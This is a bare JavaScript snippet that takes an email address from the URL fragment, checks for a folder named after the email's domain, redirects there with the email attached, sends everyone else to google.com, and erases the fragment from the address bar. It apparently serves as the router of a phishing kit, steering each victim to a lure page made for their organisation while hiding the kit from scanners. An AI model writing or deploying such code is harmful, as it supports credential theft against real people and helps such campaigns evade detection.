<script>
  const email = window.location.hash.substring(1).trim();

  if (email && email.includes("@")) {
    // Extract domain folder
    const domain = email.split("@")[1];
    const folder = domain.split(".")[0];

    // Try to fetch index.html inside the folder
    fetch(`./${folder}/index.html`, { method: 'HEAD' })
      .then(res => {
        if (res.ok) {
          // Folder exists — redirect with original email hash (unencoded)
          window.location.replace(`./${folder}/#${email}`);
        } else {
          // Folder not found — fallback
          window.location.replace("https://google.com");
        }
      })
      .catch(() => {
        // Error — fallback
        window.location.replace("https://google.com");
      });

    // Clean the hash from the original URL
    history.replaceState(null, null, window.location.pathname + window.location.search);
  } else {
    // Invalid or missing email — fallback
    window.location.replace("https://google.com");
  }
</script>
